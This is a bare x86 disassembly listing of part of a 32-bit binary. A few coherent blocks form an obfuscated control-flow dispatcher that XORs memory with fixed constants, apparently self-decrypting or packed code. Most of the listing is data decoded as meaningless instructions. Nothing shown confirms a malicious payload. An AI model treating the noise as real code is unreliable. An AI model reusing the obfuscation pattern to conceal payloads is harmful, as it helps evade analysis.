  402894:	xor    eax,DWORD PTR ds:0x42e7de
  40289a:	dec    eax
  40289b:	mov    ds:0x42e7de,eax
  4028a0:	mov    eax,ds:0x42e7de
  4028a5:	dec    eax
  4028a6:	mov    ds:0x42e7de,eax
  4028ab:	jmp    0x402862
  4028b0:	mov    eax,DWORD PTR [ebp-0x8]
  4028b3:	xor    eax,ecx
  4028b5:	add    eax,esi
  4028b7:	pop    edi
  4028b8:	pop    esi
  4028b9:	pop    ebx
  4028ba:	leave  
  4028bb:	ret    0x4
  4028be:	mov    eax,DWORD PTR [ebp-0xc]
  4028c1:	add    eax,DWORD PTR [ebp-0x18]
  4028c4:	cmp    eax,0x7ad64f9f
  4028c9:	je     0x402c8e
  4028cf:	jmp    0x402c80
  4028d4:	clc    
  4028d5:	inc    edi
  4028d6:	adc    ah,dl
  4028d8:	xchg   ecx,eax
  4028d9:	jge    0x4028d7
  4028db:	pop    ebx
  4028dc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4028dd:	pop    eax
  4028de:	dec    ebp
  4028df:	push   edi
  4028e0:	loop   0x40295b
  4028e2:	mov    edi,0x7e03e690
  4028e7:	jle    0x40286b
  4028e9:	jno    0x402969
  4028eb:	jle    0x40296c
  4028ed:	mov    edx,0xd738022e
  4028f2:	out    0x7f,al
  4028f4:	and    al,ah
  4028f6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4028f7:	std    
  4028f8:	mov    dh,0x47
  4028fa:	cs add DWORD PTR cs:[ebx+0x3cd459ad],0xba2df73f
  402906:	mov    ecx,0x784688f1
  40290b:	or     bl,0xbb
  40290e:	icebp  
  40290f:	adc    BYTE PTR [edx-0x11],ch
  402912:	sbb    dh,ch
  402914:	jbe    0x402941
  402916:	jo     0x402930
  402918:	cs cld 
  40291a:	mov    bl,0x38
  40291c:	inc    ebx
  40291d:	int3   
  40291e:	or     esp,esi
  402920:	dec    esi
  402921:	cmc    
  402922:	or     esp,DWORD PTR [esi+0x69feef5]
  402928:	jo     0x4028aa
  40292a:	adc    eax,0x21d89d9c
  40292f:	push   eax
  402930:	xor    cl,bl
  402932:	push   0xffffffe9
  402934:	(bad)  
  402935:	mov    ds:0x7d1e34f1,al
  40293a:	arpl   WORD PTR [eax],cx
  40293c:	iret   
  40293d:	ins    BYTE PTR es:[edi],dx
  40293e:	or     ch,bh
  402940:	(bad)  
  402941:	pop    esp
  402942:	xor    eax,0x388fb43a
  402947:	sub    edx,edx
  402949:	sar    BYTE PTR fs:[ebp+edi*4-0x39697962],0xaf
  402952:	fisubr DWORD PTR [edx-0x74185903]
  402958:	xchg   edi,eax
  402959:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40295a:	pop    eax
  40295b:	jnp    0x4029a5
  40295d:	pop    esi
  40295e:	mov    eax,ds:0x5232cfb2
  402963:	fwait
  402964:	and    BYTE PTR [edi+0x4b77dcb],cl
  40296a:	inc    ecx
  40296b:	mov    bl,0xb5
  40296d:	add    cl,BYTE PTR [esi]
  40296f:	(bad)  
  402970:	stc    
  402971:	(bad)  
  402973:	sub    BYTE PTR [edi],dh
  402975:	pop    ebx
  402976:	dec    edi
  402977:	(bad)  
  402978:	loope  0x402932
  40297a:	ret    0x1fc
  40297d:	fistp  DWORD PTR [edx+0x4f8b004]
  402983:	sub    eax,0xfc9b680a
  402988:	lea    edi,[ebx]
  40298a:	adc    ebx,ebx
  40298c:	shl    BYTE PTR [eax+edx*4+0x58],1
  402990:	ja     0x402950
  402992:	dec    ebx
  402993:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402994:	cmp    BYTE PTR [esi-0x24f1bc04],dl
  40299a:	dec    ebp
  40299b:	and    al,BYTE PTR [ebx+0x7f]
  40299e:	jl     0x4029a5
  4029a0:	clc    
  4029a1:	ja     0x40295d
  4029a3:	adc    esi,esp
  4029a5:	dec    ecx
  4029a6:	pop    esp
  4029a7:	in     eax,dx
  4029a8:	into   
  4029a9:	mov    bh,0x47
  4029ab:	test   al,dl
  4029ad:	push   ecx
  4029ae:	adc    al,0x12
  4029b0:	jns    0x40298d
  4029b2:	mov    al,ds:0xd4862c7c
  4029b7:	aam    0x7b
  4029b9:	sbb    DWORD PTR [edx+0xa62ab2],esp
  4029bf:	test   BYTE PTR [ecx+0x24d47e58],al
  4029c5:	xor    DWORD PTR [edx+0x52],ecx
  4029c8:	popf   
  4029c9:	fmul   st(1),st
  4029cb:	adc    DWORD PTR [edx],eax
  4029cd:	jo     0xa9effc0
  4029d3:	lods   eax,DWORD PTR ds:[esi]
  4029d4:	jp     0x402a0c
  4029d6:	mov    bh,0xfc
  4029d8:	pop    edx
  4029d9:	jecxz  0x402a0b
  4029db:	pop    edx
  4029dc:	sahf   
  4029dd:	aas    
  4029de:	or     ebp,DWORD PTR [edi]
  4029e0:	pop    ecx
  4029e1:	jmp    0x56ec:0x2e2f0f80
  4029e8:	cmp    edi,eax
  4029ea:	mov    fs,WORD PTR [eax]
  4029ec:	fcomp  DWORD PTR [edx-0x2a]
  4029ef:	in     eax,0x51
  4029f1:	(bad)  
  4029f2:	(bad)  
  4029f4:	in     al,dx
  4029f5:	bound  eax,QWORD PTR [ebx]
  4029f7:	inc    ebp
  4029f8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4029f9:	pop    es
  4029fa:	or     eax,DWORD PTR [edx+0x4509cd98]
  402a00:	mov    ds:0x45df6eb8,eax
  402a05:	aad    0x45
  402a07:	pop    es
  402a08:	daa    
  402a09:	and    al,0x88
  402a0b:	rdpmc  
  402a0d:	jnp    0x4029d0
  402a0f:	pop    esp
  402a10:	popf   
  402a11:	in     eax,0xd1
  402a13:	call   0x41bc:0x469dbe73
  402a1a:	jmp    0x643de431
  402a1f:	das    
  402a20:	test   eax,0x7b17b908
  402a25:	push   ebp
  402a26:	push   esi
  402a27:	mov    ds:0xe8172891,al
  402a2c:	ins    DWORD PTR es:[edi],dx
  402a2d:	add    ebx,DWORD PTR [edi]
  402a2f:	pop    esp
  402a30:	arpl   WORD PTR [ebx-0x70],dx
  402a33:	pop    esp
  402a34:	push   es
  402a35:	mov    esi,0x555d31b5
  402a3a:	or     ah,BYTE PTR [esp+eax*2+0x38d237d7]
  402a41:	call   0x8c4f8ae7
  402a46:	push   eax
  402a47:	fisttp QWORD PTR [ebx+0x67]
  402a4a:	ja     0x402aab
  402a4c:	push   ss
  402a4d:	mov    eax,cs:0xa0425d7b
  402a53:	js     0x402a41
  402a55:	pop    ebp
  402a56:	and    esp,0x74583ef5
  402a5c:	dec    DWORD PTR [esi+0x60]
  402a5f:	push   ds
  402a60:	mov    eax,DWORD PTR [ecx+0x5f]
  402a63:	jnp    0x402a16
  402a65:	mov    fs,WORD PTR [edi+0x35aa6235]
  402a6b:	push   edi
  402a6c:	sbb    al,0x1b
  402a6e:	retf   0x42e7
  402a71:	inc    esi
  402a72:	push   esi
  402a73:	xchg   esp,eax
  402a74:	daa    
  402a75:	repz mov bl,0x16
  402a78:	cmp    al,0x61
  402a7a:	ja     0x402a28
  402a7c:	call   0x2295:0xae80e86b
  402a83:	inc    esp
  402a84:	stos   DWORD PTR es:[edi],eax
  402a85:	pop    ebx
  402a86:	add    eax,0x50c8afb1
  402a8b:	or     al,0x5d
  402a8d:	mov    ah,0xad
  402a8f:	enter  0xd7ea,0xb7
  402a93:	mov    ebx,0x48ab2aca
  402a98:	cld    
  402a99:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402a9a:	inc    esi
  402a9b:	mov    ds:0xd0cc01eb,eax
  402aa0:	jg     0x402b20
  402aa2:	dec    esp
  402aa3:	cmp    al,0x19
  402aa5:	pop    ebp
  402aa6:	sti    
  402aa7:	mov    esp,0xc7d7a231
  402aac:	cld    
  402aad:	ss and edi,esp
  402ab0:	pop    ecx
  402ab1:	(bad)  
  402ab2:	cmp    al,0x7c
  402ab4:	adc    ebp,DWORD PTR [eax+0x19597ffd]
  402aba:	cli    
  402abb:	aaa    
  402abc:	sub    al,0x76
  402abe:	mov    ah,0x62
  402ac0:	ds loope 0x402a69
  402ac3:	xchg   DWORD PTR [ebx-0x29],ebp
  402ac6:	pushf  
  402ac7:	cmp    bl,BYTE PTR [edi+eiz*2]
  402aca:	int3   
  402acb:	ins    BYTE PTR es:[edi],dx
  402acc:	popa   
  402acd:	mov    eax,ds:0xd1709975
  402ad2:	inc    esi
  402ad3:	xchg   ebp,eax
  402ad4:	jmp    0xa73:0x55013c08
  402adb:	add    dh,bh
  402add:	imul   ebx,ebx,0x6965970a
  402ae3:	sub    esi,eax
  402ae5:	or     ebp,DWORD PTR [ebp-0x4]
  402ae8:	iret   
  402ae9:	stos   BYTE PTR es:[edi],al
  402aea:	mov    esi,0xb151ef52
  402aef:	dec    eax
  402af0:	push   ecx
  402af1:	fldcw  WORD PTR [edi-0x6db08690]
  402af7:	jl     0x402b72
  402af9:	cwde   
  402afa:	scas   eax,DWORD PTR es:[edi]
  402afb:	icebp  
  402afc:	xchg   edi,eax
  402afd:	rcl    DWORD PTR [eax+eax*1+0x6539717c],0x87
  402b05:	sub    eax,0xee0ccd51
  402b0a:	sub    eax,DWORD PTR [ecx+0x629745cb]
  402b10:	xor    al,0x23
  402b12:	sbb    al,0xa5
  402b14:	clc    
  402b15:	add    eax,0x9a32c7f6
  402b1a:	lods   eax,DWORD PTR ds:[esi]
  402b1b:	aaa    
  402b1c:	dec    ebp
  402b1d:	dec    ebp
  402b1e:	sahf   
  402b1f:	push   0xdf986606
  402b24:	xor    bl,BYTE PTR [edi+esi*8]
  402b27:	mov    bl,0x64
  402b29:	cmp    al,0xcc
  402b2b:	jns    0x402b5f
  402b2d:	ret    
  402b2e:	jmp    0x402afa
  402b30:	add    al,0x47
  402b32:	pushf  
  402b33:	ins    BYTE PTR es:[edi],dx
  402b34:	dec    edx
  402b35:	fadd   DWORD PTR [eax+eiz*2+0x41]
  402b39:	mov    ah,al
  402b3b:	sbb    eax,0x577b0982
  402b40:	mov    al,0x68
  402b42:	sbb    BYTE PTR [eax+0x43],ch
  402b45:	adc    DWORD PTR [esi+edx*2],ebp
  402b48:	in     eax,0x8
  402b4a:	inc    ecx
  402b4b:	cmp    al,0xcf
  402b4d:	cwde   
  402b4e:	fisub  DWORD PTR [bp+di]
  402b51:	mov    ch,0xf1
  402b53:	in     al,0x43
  402b55:	mov    gs,WORD PTR [ebp-0xc]
  402b58:	cwde   
  402b59:	fwait
  402b5a:	ret    
  402b5b:	aaa    
  402b5c:	leave  
  402b5d:	lods   al,BYTE PTR ds:[esi]
  402b5e:	or     eax,0x8ddc561b
  402b63:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402b64:	push   0xbfca927f
  402b69:	retf   
  402b6a:	int    0xe
  402b6c:	jae    0x402b80
  402b6e:	xchg   esp,eax
  402b6f:	gs sbb al,bh
  402b72:	xchg   ebp,eax
  402b73:	shl    BYTE PTR [eax+0x53],1
  402b76:	push   eax
  402b77:	xor    BYTE PTR [ebp+0x4a98b3ab],ch
  402b7d:	repz mov dh,0xba
  402b80:	xchg   ecx,eax
  402b81:	push   0x25
  402b83:	inc    eax
  402b84:	jge    0x402b7f
  402b86:	mov    al,ds:0x3843dda
  402b8b:	sub    BYTE PTR [ecx+0x48193658],cl
  402b91:	xor    edx,DWORD PTR [ebp+ecx*4+0x5c0823fd]
  402b98:	mov    ch,BYTE PTR [esi-0x6d94380f]
  402b9e:	xchg   ebx,eax
  402b9f:	sub    bh,0x8d
  402ba2:	imul   BYTE PTR [edi-0x49]
  402ba5:	mov    ebp,0xd3d45b5c
  402baa:	xlat   BYTE PTR ds:[ebx]
  402bab:	push   edx
  402bac:	inc    BYTE PTR ds:0x9d3e1f0c
  402bb2:	mov    eax,0x5b42a1fb
  402bb7:	frstor [ecx]
  402bb9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402bba:	mov    ?,ebp
  402bbc:	mov    ebp,0xdae23bdf
  402bc1:	loopne 0x402bb5
  402bc3:	lods   eax,DWORD PTR ds:[esi]
  402bc4:	xor    eax,0xf783ec68
  402bc9:	jae    0x402c2c
  402bcb:	sbb    al,0xaf
  402bcd:	add    eax,0xb57252e2
  402bd2:	iret   
  402bd3:	mov    edx,0xf5a047b4
  402bd8:	jb     0x402be5
  402bda:	loope  0x402c5b
  402bdc:	adc    edi,DWORD PTR [edi-0x330265a3]
  402be2:	push   ecx
  402be3:	jmp    0x3eb5:0x593b115e
  402bea:	mov    ds:0xd9d06a18,eax
  402bef:	push   cs
  402bf0:	cli    
  402bf1:	push   ebp
  402bf2:	in     al,0xe0
  402bf4:	dec    ecx
  402bf5:	jns    0x402b95
  402bf7:	int3   
  402bf8:	push   DWORD PTR [esi+0x3c203908]
  402bfe:	xchg   edx,eax
  402bff:	or     DWORD PTR [eax],ecx
  402c01:	loop   0x402c4c
  402c03:	or     al,0xba
  402c05:	test   al,0x0
  402c07:	inc    eax
  402c08:	pop    ds
  402c09:	or     eax,0xb04263e0
  402c0e:	sub    ebx,DWORD PTR [ebx+esi*2]
  402c11:	adc    al,0xee
  402c13:	stos   BYTE PTR es:[edi],al
  402c14:	lods   eax,DWORD PTR ds:[esi]
  402c15:	repz not BYTE PTR [eax]
  402c18:	pop    es
  402c19:	inc    esp
  402c1a:	or     DWORD PTR [ecx],ebp
  402c1c:	shl    DWORD PTR [edx+0x680609c2],cl
  402c22:	push   0xec5058b2
  402c27:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402c28:	lds    ebx,FWORD PTR [ecx]
  402c2a:	shl    BYTE PTR [eax+0x40],1
  402c2d:	pop    ss
  402c2e:	out    0x9e,eax
  402c30:	adc    DWORD PTR [ecx+0x21],edx
  402c33:	pop    edx
  402c34:	adc    edx,esp
  402c36:	mov    ebx,0x1c1a0ea7
  402c3b:	aas    
  402c3c:	out    0x30,al
  402c3e:	mov    edi,0x78425196
  402c43:	mov    DWORD PTR [ecx+0x2b7a07b4],ebx
  402c49:	data16 jp 0x402c71
  402c4c:	ss in  al,dx
  402c4e:	push   cs
  402c4f:	sbb    al,0x7c
  402c51:	sbb    BYTE PTR [ebx],bh
  402c53:	dec    ebp
  402c54:	lock sahf 
  402c56:	sub    esp,edx
  402c58:	lds    ebx,FWORD PTR [di+0x5e]
  402c5c:	add    bh,BYTE PTR ds:0x5b579f30
  402c62:	fsubrp st(0),st
  402c64:	push   edi
  402c65:	push   esp
  402c66:	push   esi
  402c67:	jecxz  0x402c27
  402c69:	fisttp WORD PTR [eax+eax*4+0x22d8a43a]
  402c70:	in     al,0x3a
  402c72:	dec    ecx
  402c73:	aad    0xbd
  402c75:	add    dh,BYTE PTR [edx]
  402c77:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402c78:	push   0xc4f04a07
  402c7d:	mov    BYTE PTR [edx-0x43],bl
  402c80:	mov    eax,DWORD PTR [ebp-0x10]
  402c83:	and    DWORD PTR [eax],0x751c9d
  402c89:	jmp    0x402858
  402c8e:	mov    eax,DWORD PTR [ebp-0xc]
  402c91:	mov    edx,DWORD PTR [ebp-0x18]
  402c94:	or     eax,edx
  402c96:	cmp    eax,0xfabf2dff
  402c9b:	je     0x403060
  402ca1:	mov    eax,DWORD PTR [ebp-0x10]
  402ca4:	xor    DWORD PTR [eax],0x2650fa8f
  402caa:	jmp    0x402858
  402caf:	jmp    0x403060
  402cb4:	adc    al,0x1c
  402cb6:	repnz push edx
  402cb8:	mov    edx,0x415cd47c
  402cbd:	test   dl,cl
  402cbf:	inc    esp
  402cc0:	sbb    eax,0xae6f7ab
  402cc5:	pop    es
  402cc6:	jle    0x402d46
  402cc8:	xor    BYTE PTR [ecx+0x7e],0x7e
  402ccc:	call   0x968a243b
  402cd1:	mov    DWORD PTR [edi-0x6f],ebx
  402cd4:	leave  
  402cd5:	mov    ecx,0xae98262c
  402cda:	daa    
  402cdb:	sub    ch,al
  402cdd:	mov    esp,0x9fd8ba19
  402ce2:	sti    
  402ce3:	popf   
  402ce4:	stos   DWORD PTR es:[edi],eax
  402ce5:	and    dh,BYTE PTR [ecx+0x65112f11]
  402ceb:	sub    DWORD PTR [ebp+0x39486602],ebp
  402cf1:	xor    al,0xd7
  402cf3:	popa   
  402cf4:	or     edi,DWORD PTR [ebx]
  402cf6:	scas   eax,DWORD PTR es:[edi]
  402cf7:	pushf  
  402cf8:	out    dx,al
  402cf9:	out    dx,eax
  402cfa:	sar    BYTE PTR [ecx-0x76],1
  402cfd:	out    dx,ax
  402cff:	jns    0x402d0c
  402d01:	stc    
  402d02:	jmp    0x402c84
  402d04:	jg     0x402d0f
  402d06:	dec    edx
  402d07:	pop    edi
  402d08:	inc    esp
  402d09:	(bad)  
  402d0a:	shl    DWORD PTR [eax+0x2e],1
  402d0d:	(bad)  
  402d0e:	nop
  402d0f:	xor    BYTE PTR [edx+0x76d659bf],al
  402d15:	pop    ds
  402d16:	test   eax,0xea81f9cb
  402d1b:	mov    esp,0xe6b165a8
  402d20:	pusha  
  402d21:	sbb    eax,0x1645b49b
  402d26:	test   BYTE PTR [esi+0x1c],0xa4
  402d2a:	test   DWORD PTR [eax-0x1344593e],edi
  402d30:	cli    
  402d31:	adc    esi,edi
  402d33:	loop   0x402d2c
  402d35:	xor    eax,0xd597fbd9
  402d3a:	and    bl,BYTE PTR [ebp-0x63]
  402d3d:	jb     0x402d8e
  402d3f:	xor    al,0xb3
  402d41:	js     0x402d63
  402d43:	xor    eax,0xbec3b7eb
  402d48:	iret   
  402d49:	fidiv  DWORD PTR [ecx+esi*4+0x555525ff]
  402d50:	in     al,dx
  402d51:	fadd   QWORD PTR [esi]
  402d53:	int3   
  402d54:	push   ss
  402d55:	cli    
  402d56:	test   eax,0xadeb9e1a
  402d5b:	cli    
  402d5c:	dec    BYTE PTR ds:0xe7c92db9
  402d62:	push   ebx
  402d63:	sub    BYTE PTR [edx-0x24],dh
  402d66:	mov    cl,0x53
  402d68:	mov    cl,0xe
  402d6a:	loope  0x402de0
  402d6c:	add    DWORD PTR [ecx-0x78],0xab1cf6df
  402d73:	inc    esi
  402d74:	in     al,0x94
  402d76:	dec    eax
  402d77:	mov    ds:0x989b6ebd,al
  402d7c:	in     al,0xc5
  402d7e:	in     eax,0xbe
  402d80:	or     ah,dh
  402d82:	cli    
  402d83:	inc    edx
  402d84:	push   0x34d9e452
  402d89:	or     BYTE PTR [edx+0xa],bh
  402d8c:	and    eax,DWORD PTR [ecx-0x28a6da58]
  402d92:	das    
  402d93:	pop    esp
  402d94:	or     BYTE PTR [ecx+0x3f],bh
  402d97:	mov    ecx,0xef5fe5cc
  402d9c:	ds push esi
  402d9e:	xlat   BYTE PTR ds:[ebx]
  402d9f:	adc    esp,DWORD PTR [esi+0x24cea526]
  402da5:	rcl    DWORD PTR [edx],1
  402da7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402da8:	push   eax
  402da9:	pop    esi
  402daa:	xchg   ecx,eax
  402dab:	ds in  eax,dx
  402dad:	scas   eax,DWORD PTR es:[edi]
  402dae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402daf:	repz into 
  402db1:	mov    esp,0x5e909b21
  402db6:	leave  
  402db7:	xchg   ecx,eax
  402db8:	adc    bl,BYTE PTR [ebx+0x55384fc1]
  402dbe:	test   al,0xc3
  402dc0:	rcl    esi,1
  402dc2:	pop    ebp
  402dc3:	jne    0x402dea
  402dc5:	jae    0x402d7e
  402dc7:	jg     0x402e0f
  402dc9:	cmp    BYTE PTR [ebx+0x17],ch
  402dcc:	enter  0x1287,0x57
  402dd0:	sbb    eax,0x725ef1a3
  402dd5:	mov    ds:0x8adaa5ed,al
  402dda:	or     esp,DWORD PTR ds:[eax-0x3b]
  402dde:	mov    bh,0x4d
  402de0:	xchg   esp,eax
  402de1:	loopne 0x402e53
  402de3:	jge    0x402e28
  402de5:	mov    ?,esp
  402de7:	test   al,0x82
  402de9:	adc    ebp,ebx
  402deb:	call   0xa762:0xa4df28a7
  402df2:	(bad)  
  402df3:	imul   BYTE PTR [ebx]
  402df5:	retf   0x5419
  402df8:	ins    BYTE PTR es:[edi],dx
  402df9:	fiadd  WORD PTR [edi-0x4b]
  402dfc:	mov    ebx,0xb930c81f
  402e01:	cld    
  402e02:	iret   
  402e03:	gs push 0x6
  402e06:	dec    ebx
  402e07:	jecxz  0x402e4a
  402e09:	ins    BYTE PTR es:[edi],dx
  402e0a:	inc    ecx
  402e0b:	mov    BYTE PTR [edi+edx*8+0x5e],0x54
  402e10:	push   ebp
  402e11:	icebp  
  402e12:	lods   al,BYTE PTR ds:[esi]
  402e13:	jg     0x402e71
  402e15:	push   0xde255bf3
  402e1a:	xchg   ebp,eax
  402e1b:	or     ebx,0x447100e1
  402e21:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402e22:	mov    al,BYTE PTR [edx-0x1]
  402e25:	jbe    0x402e1e
  402e27:	lods   eax,DWORD PTR ds:[esi]
  402e28:	dec    eax
  402e29:	xchg   edx,eax
  402e2a:	ins    BYTE PTR es:[edi],dx
  402e2b:	inc    eax
  402e2c:	jecxz  0x402ea0
  402e2e:	jns    0x402e7e
  402e30:	ss scas al,BYTE PTR es:[edi]
  402e32:	les    edx,FWORD PTR [eax-0x3799846e]
  402e38:	mov    ebp,0x6b487dad
  402e3d:	cmp    edi,DWORD PTR [esi+0x533eb694]
  402e43:	clc    
  402e44:	adc    eax,0x6ddda68e
  402e49:	add    ah,BYTE PTR gs:[ebp+0x55]
  402e4d:	push   0xcf731bc
  402e52:	iret   
  402e53:	or     ebp,DWORD PTR fs:[edx-0x1d292690]
  402e5a:	ret    0x115a
  402e5d:	xchg   ecx,eax
  402e5e:	pop    eax
  402e5f:	dec    ebx
  402e60:	add    eax,0x3c472100
  402e65:	(bad)  
  402e66:	repnz cmp eax,0x26cfc9c5
  402e6c:	jno    0x402e21
  402e6e:	aaa    
  402e6f:	adc    al,0xeb
  402e71:	mov    ecx,0xf2d17d2b
  402e76:	push   edi
  402e77:	call   0xed3a84de
  402e7c:	rcl    BYTE PTR [edx],1
  402e7e:	scas   eax,DWORD PTR es:[edi]
  402e7f:	inc    ecx
  402e80:	es mov dh,0x19
  402e83:	cld    
  402e84:	fbld   TBYTE PTR [ecx]
  402e86:	jl     0x402ecc
  402e88:	xchg   BYTE PTR [edi],al
  402e8a:	in     al,0x71
  402e8c:	dec    ebp
  402e8d:	ret    
  402e8e:	adc    BYTE PTR [esi],bh
  402e90:	cli    
  402e91:	mov    ds:0xb0bc4b04,eax
  402e96:	jne    0x402e23
  402e98:	arpl   WORD PTR [edi],cx
  402e9a:	jp     0x402e8c
  402e9c:	pusha  
  402e9d:	(bad)  
  402e9e:	popa   
  402e9f:	pop    esi
  402ea0:	neg    BYTE PTR [esi+edx*4]
  402ea3:	and    dl,BYTE PTR [edi+0x13bb056]
  402ea9:	outs   dx,DWORD PTR ds:[esi]
  402eaa:	sbb    ebx,ebp
  402eac:	sub    ch,BYTE PTR [esi+0x1b]
  402eaf:	pop    ss
  402eb0:	cmp    dl,ch
  402eb2:	ss sti 
  402eb4:	pop    es
  402eb5:	in     eax,dx
  402eb6:	sbb    ah,BYTE PTR [edx]
  402eb8:	mov    BYTE PTR [ebx],ch
  402eba:	sar    DWORD PTR [ecx+ecx*4+0xbfcd0bf],cl
  402ec1:	aam    0xe4
  402ec3:	jne    0x402e68
  402ec5:	sbb    al,0x25
  402ec7:	(bad)  
  402ec8:	pop    edi
  402ec9:	inc    eax
  402eca:	stos   DWORD PTR es:[edi],eax
  402ecb:	jnp    0x402e8c
  402ecd:	add    DWORD PTR [ecx],edx
  402ecf:	loop   0x402e7b
  402ed1:	pop    esp
  402ed2:	inc    eax
  402ed3:	popa   
  402ed4:	jne    0x402e60
  402ed6:	and    ah,ch
  402ed8:	rcr    BYTE PTR [edi-0x39],1
  402edb:	gs sti 
  402edd:	call   0x354e:0x94217e92
  402ee4:	jne    0x402f05
  402ee6:	imul   eax,DWORD PTR [eax+0x3eaa31c7],0xa1800a28
  402ef0:	mov    cl,0x6c
  402ef2:	xchg   DWORD PTR [ebp+0x4390aaeb],edx
  402ef8:	cmp    ch,cl
  402efa:	mov    dh,ch
  402efc:	sub    esp,DWORD PTR [ecx]
  402efe:	(bad)  
  402eff:	call   DWORD PTR [edi]
  402f01:	or     eax,0x4b930599
  402f06:	fist   DWORD PTR [esi-0x51]
  402f09:	xchg   edx,eax
  402f0a:	mov    cl,0xbe
  402f0c:	and    BYTE PTR [esi+0x6a13d8e3],dl
  402f12:	bound  edx,QWORD PTR ds:0x51c7c2ae
  402f18:	add    al,0xe3
  402f1a:	mov    bh,0xa5
  402f1c:	xor    DWORD PTR [esi],0x75
  402f1f:	xchg   esi,eax
  402f20:	loopne 0x402f18
  402f22:	and    DWORD PTR ds:0x89844d79,ebp
  402f28:	aam    0x52
  402f2a:	and    al,0x60
  402f2c:	fmul   st(5),st
  402f2e:	sub    edx,DWORD PTR [ecx]
  402f30:	dec    ecx
  402f31:	out    dx,al
  402f32:	push   esi
  402f33:	and    ah,dh
  402f35:	shl    DWORD PTR [esi-0x158d44a],0xb1
  402f3c:	push   0x5
  402f3e:	mov    eax,ds:0x8a2238f0
  402f43:	(bad)  
  402f44:	sbb    esi,DWORD PTR [ecx]
  402f46:	sbb    bl,BYTE PTR [ecx-0x54668149]
  402f4c:	jl     0x402edb
  402f4e:	idiv   BYTE PTR [ecx+0x31403157]
  402f54:	mov    es,ecx
  402f56:	push   es
  402f57:	push   ebp
  402f58:	mov    eax,DWORD PTR [ecx-0x54]
  402f5b:	mov    eax,0x47570efd
  402f60:	scas   al,BYTE PTR es:[edi]
  402f61:	dec    ebp
  402f62:	and    BYTE PTR [edx+ecx*2-0x6fc66eea],dl
  402f69:	ss push ebx
  402f6b:	jge    0x402f3b
  402f6d:	or     dl,bl
  402f6f:	sbb    dl,BYTE PTR [ebx-0x3b]
  402f72:	push   0xef233796
  402f77:	mov    cl,0x7f
  402f79:	inc    edi
  402f7a:	test   ecx,edi
  402f7c:	push   esi
  402f7d:	inc    edi
  402f7e:	clc    
  402f7f:	cmc    
  402f80:	fst    st(3)
  402f82:	sbb    BYTE PTR [edx],cl
  402f84:	and    bh,BYTE PTR [esi+0x46]
  402f87:	enter  0xb5ed,0x28
  402f8b:	(bad)
  402f8e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402f8f:	sbb    al,0xc8
  402f91:	push   es
  402f92:	test   eax,0x21f07fc4
  402f97:	iret   
  402f98:	mov    dh,0x68
  402f9a:	adc    BYTE PTR [edx+0xa866d9d],bl
  402fa0:	in     eax,dx
  402fa1:	in     al,dx
  402fa2:	repz fwait
  402fa4:	or     eax,0x16afd229
  402fa9:	adc    esi,0x68
  402fac:	and    bh,0x3b
  402faf:	mov    WORD PTR [edx+edx*8],ds
  402fb2:	jl     0x402ffc
  402fb4:	and    eax,0xd9dc3fea
  402fb9:	or     eax,0x3d5106b0
  402fbe:	sbb    edi,DWORD PTR [eax+0x1e9bda1e]
  402fc4:	sar    esi,1
  402fc6:	stos   BYTE PTR es:[edi],al
  402fc7:	loope  0x402f63
  402fc9:	inc    ecx
  402fca:	icebp  
  402fcb:	not    DWORD PTR [ecx-0x4c]
  402fce:	and    al,0x52
  402fd0:	pop    edi
  402fd1:	add    eax,0x7be30838
  402fd6:	sar    DWORD PTR [ebx-0x7f],1
  402fd9:	inc    ebp
  402fda:	xor    eax,0x600ad582
  402fdf:	and    eax,0xc29c02c4
  402fe4:	fs popa 
  402fe6:	sbb    eax,0x4b4fb893
  402feb:	add    ebx,DWORD PTR [edi]
  402fed:	xchg   ebx,eax
  402fee:	pop    edx
  402fef:	ss (bad) 
  402ff1:	jnp    0x402fbd
  402ff3:	enter  0xc5b7,0x88
  402ff7:	stos   DWORD PTR es:[edi],eax
  402ff8:	mov    al,0x6c
  402ffa:	jno    0x402fe6
  402ffc:	pop    edx
  402ffd:	fnstenv [edx-0x41d30724]
  403003:	and    DWORD PTR [esi+0x3316eb10],edi
  403009:	cs out 0x3c,al
  40300c:	or     eax,0x3f95687e
  403011:	inc    esp
  403012:	shr    BYTE PTR [ecx-0x7fcfb714],0x6a
  403019:	inc    edi
  40301a:	xor    dl,BYTE PTR [edx-0x5]
  40301d:	inc    esp
  40301e:	rol    BYTE PTR [ebx],cl
  403020:	sar    BYTE PTR [eax+0x5b],0xe2
  403024:	pop    esi
  403025:	popf   
  403026:	mov    ds:0xc226715f,al
  40302b:	pop    esi
  40302c:	mov    ds,ebp
  40302e:	dec    ecx
  40302f:	cmc    
  403030:	jecxz  0x40308a
  403032:	loope  0x403006
  403034:	push   cs
  403035:	pop    ecx
  403036:	mov    ds:0xba577a1b,al
  40303b:	mov    DWORD PTR [eax],esp
  40303d:	lock or al,0x2d
  403040:	retf   0x134d
  403043:	dec    edi
  403044:	in     eax,0xc3
  403046:	add    al,0x10
  403048:	fs lahf 
  40304a:	cmp    DWORD PTR [edx],ebx
  40304c:	enter  0x79e0,0xcb
  403050:	les    esp,FWORD PTR [ecx]
  403052:	jge    0x403050
  403054:	jle    0x402ff7
  403056:	add    eax,0x10e546a6
  40305b:	leave  
  40305c:	daa    
  40305d:	dec    esi
  40305e:	xchg   esp,eax
  40305f:	scas   al,BYTE PTR es:[edi]
  403060:	mov    ax,WORD PTR [ebp-0x4]
  403064:	jmp    0x403415
  403069:	jl     0x403082
  40306b:	sub    al,0xf7
  40306d:	jge    0x402ffc
  40306f:	jge    0x40306e
  403071:	inc    edx
  403072:	sbb    dh,BYTE PTR [ebx]
  403074:	(bad)  [edi-0x611a017a]
  40307a:	sbb    bh,BYTE PTR [esi+0x7e]
